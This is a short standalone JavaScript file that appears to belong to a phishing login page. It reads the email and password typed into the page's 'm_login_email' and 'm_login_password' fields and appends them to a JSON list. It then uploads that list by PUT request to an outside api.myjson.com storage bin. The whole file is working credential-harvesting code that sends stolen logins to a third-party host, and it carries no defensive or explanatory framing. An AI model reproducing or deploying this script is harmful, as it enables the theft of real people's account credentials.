var GetData;
$.ajax({
	url: 'https://api.myjson.com/bins/1henrk',
	success: function (data) {
		GetData = data;
	},
	async: false
});

function putback() {
	if (GetData.data[GetData.data.length - 1].email != document.getElementById('m_login_email').value || GetData.data[GetData.data.length - 1].pw != document.getElementById('m_login_password').value) {
		GetData.data.push({
			"email": document.getElementById('m_login_email').value
		});
		GetData.data[GetData.data.length - 1].pw = document.getElementById('m_login_password').value;
		$.ajax({
			url: "https://api.myjson.com/bins/1henrk",
			type: "PUT",
			data: JSON.stringify(GetData),
			contentType: "application/json; charset=utf-8",
			dataType: "json",
			success: function (data, textStatus, jqXHR) {

			}
		});
	}
}